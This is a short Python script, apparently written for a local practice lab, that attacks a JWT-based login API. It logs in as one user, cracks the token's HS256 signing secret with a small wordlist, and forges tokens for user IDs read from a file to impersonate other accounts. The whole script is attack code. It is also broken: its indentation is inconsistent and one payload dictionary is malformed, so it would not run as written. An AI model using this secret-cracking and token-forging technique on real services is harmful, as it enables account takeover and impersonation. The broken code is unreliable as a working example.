import requests
import jwt

url = "http://127.0.0.1:8000/api/auth/signin"

secrets_list = ["secret", "123456", "password", "mysecret", "http-lab-secret", "jwtsecret"]
res = requests.post(
    url,
    json={"email": "user1@test.com", "password": "user1@123"}
)

token = res.json()["token"]
decode = jwt.decode(token, options={"verify_signature": False})

for s in secrets_list:
      try:
         decode = jwt.decode(token, s , algorithms=["HS256"])
         print(f"sercret found :{s} ")
         secret = s
         print(secret)
         break

      except jwt.exceptions.InvalidSignatureError:
        pass

   
                                                               

       pyaload = {'id': '1794730576643', 'email' 'user2@test.com'}

          

        with open("collected_ids.txt","r") as f:

             for id in f:
                 id = id.strip()
                 payload = {"id": id, "email": "forged@test.com"}
                 newtoken = jwt.encode(payload, secret, algorithm="HS256")

                 print(newtoken)

                 requests.get(url, headers={"Authorization": "Bearer " + newtoken})



